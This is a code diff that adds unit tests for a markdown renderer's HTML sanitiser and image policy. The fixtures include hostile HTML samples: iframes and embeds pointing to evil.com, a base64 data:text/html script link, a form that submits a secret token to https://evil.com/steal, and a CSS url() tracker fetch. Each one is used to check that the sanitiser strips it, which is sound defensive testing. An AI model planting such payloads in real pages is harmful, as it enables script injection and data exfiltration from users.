@@ -125,6 +125,34 @@ describe("renderMarkdown image policy", () => {
     expect(html).toContain("Image blocked");
     expect(html).not.toContain("alert(1)");
   });
+
+  // v0.17 slice 2.3 — cap embedded data:image URIs at 2 MB.
+  // A payload larger than this would produce a sluggish
+  // preview parse and a multi-megabyte export file.
+
+  it("blocks oversized data:image URIs", () => {
+    // 2 MB + 1 byte of base64-like payload pushes the
+    // URI length past MAX_EMBEDDED_IMAGE_BYTES, so
+    // `isAllowedEmbeddedImageSource` returns false
+    // before the regex even runs. The image policy then
+    // treats it as an external image → blocked message.
+    const payload = "A".repeat(2 * 1024 * 1024 + 1);
+    const oversized = `![big](data:image/png;base64,${payload})`;
+
+    const html = renderMarkdown(oversized);
+
+    expect(html).toContain("Image blocked");
+    expect(html).not.toContain("data:image/png");
+  });
+
+  it("continues to allow small valid data:image/png URIs", () => {
+    const html = renderMarkdown(
+      "![icon](data:image/png;base64,iVBORw0KGgo=)",
+    );
+
+    expect(html).not.toContain("Image blocked");
+    expect(html).toContain("data:image/png;base64,iVBORw0KGgo=");
+  });
 });
 
 // v0.17 app-store-quality: markdown-preview-export-security slice 2.1
@@ -205,5 +233,96 @@ describe("renderMarkdown sanitization", () => {
     renderMarkdown(source);
 
     expect(source).toBe(snapshot);
+  });
+
+  // v0.17 app-store-quality: slice 2.3 — remaining
+  // DOMPurify coverage. `FORBID_TAGS` now covers
+  // `<style>` (CSS url() external fetch path),
+  // `<form>`/`<input>`/`<button>` (off-site submit
+  // targets in export), and `<object>`/`<embed>`/
+  // `<iframe>` (multi-media script containers).
+  // The `ALLOWED_URI_REGEXP` rejects `data:` in `href`,
+  // leaving a bare `<a>` with the link text intact.
+
+  it("strips object, embed, and iframe tags from raw HTML", () => {
+    const html = renderMarkdown(
+      '<object data="evil.swf"></object>\n' +
+        '<embed src="evil.swf">\n' +
+        '<iframe src="https://evil.com"></iframe>\n' +
+        '<p>safe</p>',
+    );
+
+    expect(html).not.toContain("<object");
+    expect(html).not.toContain("<embed");
+    expect(html).not.toContain("<iframe");
+    expect(html).toContain("safe");
+  });
+
+  it("removes data: URIs from anchor href attributes", () => {
+    // The ALLOWED_URI_REGEXP rejects any scheme not in
+    // the known-safe list (http, https, mailto, etc.).
+    // `data:text/html` falls through every alternative
+    // → the href is removed, leaving a bare `<a>`
+    // element with the link text intact.
+    const html = renderMarkdown(
+      '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
+    );
+
+    expect(html).not.toContain("data:text/html");
+    expect(html).toContain("click");
+  });
+
+  it("strips form elements and their interaction controls", () => {
+    // `<form>`, `<input>`, `<button>`, `<textarea>`,
+    // `<select>`, and `<option>` are all listed in
+    // `FORBID_TAGS`. They are not script vectors, but
+    // their `action` / `formaction` attributes can
+    // point to an off-site submit target in exported
+    // HTML — a fetch/submit path the Safe Editor must
+    // not create. Stripping the tags entirely also
+    // keeps the exported HTML trivially free of any
+    // form-borne data-exfiltration vector.
+    const html = renderMarkdown(
+      '<form action="https://evil.com/steal">' +
+        '<input name="token" value="secret">' +
+        '<button type="submit">send</button>' +
+        '</form>\n' +
+        '<textarea>draft</textarea>\n' +
+        '<select><option>pick</option></select>',
+    );
+
+    // All forbidden tags must be absent from the output.
+    expect(html).not.toContain("<form");
+    expect(html).not.toContain("<input");
+    expect(html).not.toContain("<button");
+    expect(html).not.toContain("<textarea");
+    expect(html).not.toContain("<select");
+    expect(html).not.toContain("<option");
+    // Neither the submit target nor the form values
+    // must survive anywhere in the DOM.
+    expect(html).not.toContain("https://evil.com");
+    expect(html).not.toContain("secret");
+  });
+
+  it("strips style tags that could carry CSS url() external fetches", () => {
+    // DOMPurify's HTML profile does not sanitise CSS
+    // content inside a `<style>` block, so
+    // `url(https://...)` references survive the default
+    // pass. Adding `style` to `FORBID_TAGS` removes the
+    // entire block, which also removes any
+    // `@import` / `url()` / `@font-face` loading paths
+    // the CSS might have carried.
+    const html = renderMarkdown(
+      '<style>\n' +
+        '  body { background: url("https://tracker.example.com/px.gif"); }\n' +
+        '</style>\n' +
+        '<p>visible text</p>',
+    );
+
+    expect(html).not.toContain("<style");
+    expect(html).not.toContain("url(");
+    expect(html).not.toContain("tracker.example.com");
+    // Non-forbidden content must pass through.
+    expect(html).toContain("visible text");
   });
 });
